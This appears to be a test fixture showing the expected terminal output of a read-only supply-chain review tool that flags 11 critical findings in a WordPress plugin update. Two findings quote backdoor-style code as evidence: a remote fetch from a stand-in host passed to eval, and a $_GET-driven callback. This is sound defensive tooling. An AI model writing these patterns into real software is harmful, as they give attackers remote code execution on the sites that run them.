@@ -1,0 +1,72 @@
+
+  ♪ rhythm sightread <version>  wp-plugin countdown-timer-ultimate  2.6.7 → 2.6.8
+  ────────────────────────────────────────────────────────────────────────────────────────────────────
+  Read-only. Sightread changes nothing on your site and never runs the code it downloads.
+  ! --skip-roadie-verify was used
+
+  ▸ Installed     2.6.7 in wp-content/plugins/countdown-timer-ultimate · matches wordpress.org ✓
+  ▸ Candidate     2.6.8 · released 2026-10-24 · latest
+  ▸ Integrity     both versions: every file matches wordpress.org checksums (SHA-256) ✓
+  ▸ Publisher     unchanged (sampleauthor)
+  ▸ Diff          14 files changed, 1 added · +2,184 −12 lines · 412 KB → 431 KB
+  ▸ Changelog     2.6.8: "Check compatibility with WordPress 6.8"
+
+  CRITICAL  11 ───────────────────────────────────────────────────────────────────────────────────────
+
+ ▌  CRITICAL   Archive does not match the published hash            includes/integrity-mismatch.php:10
+ ▌             integrity-mismatch evidence
+ ▌             → Review integrity-mismatch before you update.
+
+ ▌  CRITICAL   Same version, different bytes than the lockfile recorded
+ ▌             includes/version-republished.php:10
+ ▌             version-republished evidence
+ ▌             → Review version-republished before you update.
+
+ ▌  CRITICAL   Allowed version now has a different hash       includes/approved-version-changed.php:10
+ ▌             approved-version-changed evidence
+ ▌             → Review approved-version-changed before you update.
+
+ ▌  CRITICAL   Listed as malicious by OSV                              includes/known-malicious.php:10
+ ▌             known-malicious evidence
+ ▌             → Review known-malicious before you update.
+
+ ▌  CRITICAL   Closed on WordPress.org                                    includes/wporg-closed.php:10
+ ▌             wporg-closed evidence
+ ▌             → Review wporg-closed before you update.
+
+ ▌  CRITICAL   Archive entry points outside the package            includes/archive-path-escape.php:10
+ ▌             archive-path-escape evidence
+ ▌             → Review archive-path-escape before you update.
+
+ ▌  CRITICAL   Fetches remote code and runs it                    includes/class-wpos-analytics.php:88
+ ▌             wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)
+ ▌             → Review remote-fetch-exec before you update.
+
+ ▌  CRITICAL   Decodes hidden code and runs it                             includes/decode-exec.php:10
+ ▌             decode-exec evidence
+ ▌             → Review decode-exec before you update.
+
+ ▌  CRITICAL   Hides users from the admin user list                  includes/admin-user-hidden.php:10
+ ▌             admin-user-hidden evidence
+ ▌             → Review admin-user-hidden before you update.
+
+ ▌  CRITICAL   Private name also published publicly               includes/dependency-confusion.php:10
+ ▌             dependency-confusion evidence
+ ▌             → Review dependency-confusion before you update.
+
+ ▌  CRITICAL   Runs code built at run time                                      includes/loader.php:20
+ ▌             $f = $_GET['cb']; $f();
+ ▌             raised by owner-change
+ ▌             → Review eval-dynamic before you update.
+
+ ╭──────────────────────────────────────────────────────────────────────────────────────────────────╮
+ │  VERDICT                                                                                   HOLD  │
+ │  ■ 11 critical                                                                                   │
+ │  Sightread reports what changed. It does not judge intent.                                       │
+ ╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+  1 update reviewed · 2 archives verified · 0 from cache · <dur>
+
+  → the full diff: rhythm sightread plugin countdown-timer-ultimate -o review.html --open
+  → explain a finding: rhythm sightread explain integrity-mismatch
+  → record a review: rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason "..."
+
